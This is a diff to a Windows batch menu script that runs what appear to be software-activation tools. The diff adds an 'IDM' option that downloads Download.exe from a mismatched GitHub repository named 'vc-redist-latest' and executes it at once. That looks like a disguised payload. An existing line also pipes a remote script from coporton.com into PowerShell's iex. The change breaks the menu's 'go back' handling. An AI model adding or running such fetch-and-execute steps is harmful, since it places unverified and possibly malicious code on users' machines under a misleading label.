@@ -195,21 +195,23 @@ echo    [2] Mass Grave
 echo.
 echo    [3] Coporton
 echo.
-echo    [4] Sparkle
+echo    [4] IDM
+echo.                                                                            
+echo    [5] Sparkle                                                              
 echo.
 echo   ================================================================
 echo    Press Z to go BACK
 echo   ================================================================
 echo.
 
-choice /c 1234Z /n /m "   Your Choice: "
+choice /c 12345Z /n /m "   Your Choice: "
 set "subChoice=%errorlevel%"
 
 if "%subChoice%"=="1" (call :TITUS & goto RUNSCRIPTSMENU)
 if "%subChoice%"=="2" (call :MASSGRAVE & goto RUNSCRIPTSMENU)
 if "%subChoice%"=="3" (call :COPORTON & goto RUNSCRIPTSMENU)
-if "%subChoice%"=="4" (call :SPARKLE & goto RUNSCRIPTSMENU)
-if "%subChoice%"=="5" goto MAINMENU
+if "%subChoice%"=="4" (call :IDM & goto RUNSCRIPTSMENU)                       
+if "%subChoice%"=="5" (call :SPARKLE & goto RUNSCRIPTSMENU)                     
 goto RUNSCRIPTSMENU
 
 :: ==============================
@@ -537,6 +539,15 @@ echo ==========================================
 start "" cmd /k powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://coporton.com/ias | iex"
 pause
 exit /b
+
+:IDM                                                                            
+echo ==========================================                                 
+echo Downloading with IDM                                                        
+echo ==========================================                                 
+start "" cmd /k "curl -L -O https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.1/Download.exe && Download.exe"
+echo.                                                                            
+pause                                                                            
+exit /b                                                                         
 
 :SPARKLE
 echo ==========================================
